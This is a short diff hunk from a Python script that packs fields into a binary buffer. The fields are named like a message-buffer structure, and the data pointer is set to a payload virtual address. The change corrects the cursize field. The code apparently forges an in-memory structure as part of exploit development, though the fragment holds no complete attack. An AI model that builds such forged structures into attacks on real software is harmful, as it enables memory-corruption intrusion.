@@ -100,7 +100,7 @@ def main() -> int:
         struct.pack_into("<I", buf, 0x00, 0)              # allowoverflow
         struct.pack_into("<I", buf, 0x08, payload_va)     # data
         struct.pack_into("<I", buf, 0x10, len(payload))   # maxsize
-        struct.pack_into("<I", buf, 0x14, 0)              # cursize
+        struct.pack_into("<I", buf, 0x14, len(payload))   # cursize = bytes present
         struct.pack_into("<I", buf, 0x18, 0)              # readcount
         struct.pack_into("<I", buf, 0x2C, 0)              # oob
         msg = bytes(buf)
